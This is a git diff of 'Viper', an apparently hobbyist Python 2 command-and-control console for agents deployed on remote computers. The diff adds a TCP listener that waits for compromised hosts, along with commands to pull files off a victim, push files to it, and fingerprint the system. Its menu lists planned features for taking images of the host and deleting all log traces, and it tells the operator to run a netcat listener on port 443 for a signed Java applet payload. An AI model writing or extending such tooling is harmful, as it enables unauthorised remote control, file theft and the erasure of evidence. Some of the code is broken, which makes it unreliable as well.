@@ -1,16 +1,17 @@
 #!/usr/bin/python
 
-
+import socket
 import subprocess
 import os
 import sys
 import readline
-import modules.handler.ViperServer as viperserver
 import commands
 import platform
+import time
 
 
 sys.dont_write_bytecode = True
+
 
 """
 1. This is python framework designed to control agents that get deployed on computers in defense of exploitation frameworks!
@@ -28,17 +29,18 @@ def banner():
     Date : 03 March 17
     Version : v1.0
 
-#   __   _____ ___ ___ ___    ___ ___    _   __  __ _____      _____  ___ _  __    _ _   
-#   \ \ / /_ _| _ \ __| _ \  | __| _ \  /_\ |  \/  | __\ \    / / _ \| _ \ |/ /  _| | |_  #
-#    \ V / | ||  _/ _||   /  | _||   / / _ \| |\/| | _| \ \/\/ / (_) |   / ' <  |_  .  _| #
-#     \_/ |___|_| |___|_|_\  |_| |_|_\/_/ \_\_|  |_|___| \_/\_/ \___/|_|_\_|\_\ |_     _| #
-#                                                                                 |_|_|   #
+#   __   _____ ___ ___ ___     
+#   \ \ / /_ _| _ \ __| _ \  #
+#    \ V / | ||  _/ _||   /  #
+#     \_/ |___|_| |___|_|_\  #
+#                            #
                     Going low and slow
 
-$ Viper>> help for help
+$ Viper>> homehelp for help
+$ Viper>> shellhelp for shellhelp
 """
 
-def menu():
+def homemenu():
     """This is the program menu"""
     print "[*] Command options: "
     print
@@ -50,42 +52,118 @@ def menu():
     print "[*] ??????? ========= > " 
     print "\n"
 
+def shellmenu():
+    """This is the program menu"""
+    print "[*] Command options: "
+    print
+    print "[*] grab*<filename> ========= > grabs the file and saves it to the local desktop as .txt" #DONE
+    print "[*] getenv       ========= >  prints the system information" #Works
+    print "[*] getuid       ========= > Get the user level access of the shell" #works
+    print "[*] SystemInfo   ========= > Get Fingerprint of the system" #TODO
+    print "[*] capture      ========= > take images of the host machine " #Working on this
+    print "[*] Cover        ========= > Delete all traces of logs" #TODO
+    print "\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def transfer(conn,command):
+    conn.send(command)
+    f = open('/root/Desktop/test.py','wb')
+    while True:
+        bits = conn.recv(1024)
+        if 'Unable to find out the file' in bits:
+            print '[-] Unable to find out the file'
+            break
+        if bits.endswith('DONE'):
+            print '[+] Transfer completed '
+            f.close()
+            break
+        f.write(bits)
+    f.close()
+
+def send(s, path, command):
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while packet != '':
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE')
+        print('[+] File Sent!')
+        f.close()
+    else:
+        print('File does not exist')
 
 
 def console():
     while(True):
         command = raw_input('$ Viper>> ')
-        #command = command.split(" ") 
+        #command = command.split(" ")
+        if 'terminate' in command:
+            conn.send('terminate')
+            conn.close() #close the connection with host
+            break
         
-        if "help" in command:
+        if "homehelp" in command:
             for x in command:
                  x = "help"
                  print("[+] here is the help ")
-                 menu()
-                 break 
+                 homemenu()
+                 break
+
+        if "shellhelp" in command:
+            for x in command:
+                x = "help"
+                print("[+] here is the help ")
+                shellmenu()
+                break
         
-        if 'ls' in command:
+        elif 'ls' in command:
             dirlist = os.listdir(".")
             print(dirlist)
+
+        #elif 'dir' in command:
+         #   dirlist = os.listdir(".")
+          #  print(dirlist)
 
         elif 'cd' in command:
-                    for x in command:
-                        if 'cd*' in x:
-                            code, command = command.split("*")
-                            os.chdir(command)
-                            print ("[+] CWD Is " + os.getcwd())
+            for x in command:
+                if 'cd*' in x:
+                    code, command = command.split("*")
+                    os.chdir(os.path.abspath(command))
+                    #os.chdir(command)
+                    print ("[+] CWD Is " + os.getcwd())
+                    continue
 
-                        elif 'cd' in command:
-                            code, command = command.split(" ")
-                            os.chdir(command)
-                            print ("[+] CWD Is " + os.getcwd())
+                elif 'cd' in command:
+                    code, command = command.split(" ")
+                    os.chdir(os.path.abspath(command))
+                    #os.chdir(command)
+                    print ("[+] CWD Is " + os.getcwd())
+                    continue
 
-        if 'dir' in command:
-            dirlist = os.listdir(".")
-            print(dirlist)
+
+        elif 'getenv' in command:
+            s.send( "[+] Platform Is " + platform.platform())
+
+        elif 'getuid' in command:
+            s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
+
+        elif 'grab' in command:
+            transfer(conn,command)  #usage shell > grab*file
+
+        elif 'send' in command:
+            conn.send(command)
+            sendW,path = command.split('*')
+            try:
+                send(conn, path, command)
+            except Exception,e:
+                s.send (str(e))
+                pass
+
         
         elif 'handler' in command:
-            print ( "[+] Starting server standby " + viperserver.main())
+            print ( "[+] Starting server standby " + connect())
         
         elif 'client2exe' in command:
             #subprocess.call("payloads/Client2exe.sh", stdin=None, stdout=None, stderr=None, shell=True)
@@ -111,28 +189,55 @@ def console():
             pass
             
         elif 'startweb' in command:
-        		os.chdir("www/")
-        		os.system("twistd web --path html/.")
-        		os.chdir("../")
-        		print "[*] - Starting the webserver reactor"
-        		print "[*] - The webserver is listening on 127.0.0.1:8080"
-        		print "[*] - The reactor is running"
-        		print "[*] - If you deploy the java signed applet then start netcat listener first with nc -lvp 443"
-        		pass   
+                os.chdir("www/")
+                os.system("twistd web --path html/.")
+                os.chdir("../")
+                print "[*] - Starting the webserver reactor"
+                print "[*] - The webserver is listening on 127.0.0.1:8080"
+                print "[*] - The reactor is running"
+                print "[*] - If you deploy the java signed applet then start netcat listener first with nc -lvp 443"
+                pass   
             
         elif 'stopweb' in command:
-        		os.chdir("www/")
-        		os.system("kill `cat twistd.pid`")
-        		os.chdir("../")
-        		print "[*] - Stopping the webserver reactor"
-        		print "[*] - The webserver shutting down"
-        		print "[*] - The reactor is stopping"
-        		pass            
+                os.chdir("www/")
+                os.system("kill `cat twistd.pid`")
+                os.chdir("../")
+                print "[*] - Stopping the webserver reactor"
+                print "[*] - The webserver shutting down"
+                print "[*] - The reactor is stopping"
+                pass            
+
+def connect():
+    while True:
+        ip = (raw_input("Enter the LHOST IP: "))
+        port = int(raw_input("Enter the LHOST port: "))
+        try:
+            s.bind((ip, port))
+            print "[+] ip", ip, "is open"
+            print "[+] port", port, "is open"
+            s.listen(1)
+            print '[+] listening for incoming TCP connection on ip address %s and port number %d' % ('ip', port)
+            conn, addr = s.accept()
+            print '[+] We got a connection from: ',addr
+            console()
+        except socket.error:
+            time.sleep( 3.0)
+            print "[+] ip", ip, "is closed"
+            print "[+] port", port, "is closed"
+            print 'Socket connect failed! Loop up and try socket again'
+            connect()
+
+        #else:
+         #   conn.send(command)
+          #  print conn.recv(1024)
         else:
             print('')
 
         
-        
+        #except KeyboardInterrupt:
+        #print 'interrupted!'
+        #print 'returning to main program'
+        #os.system('python ../../viper.py')        
 
     
         
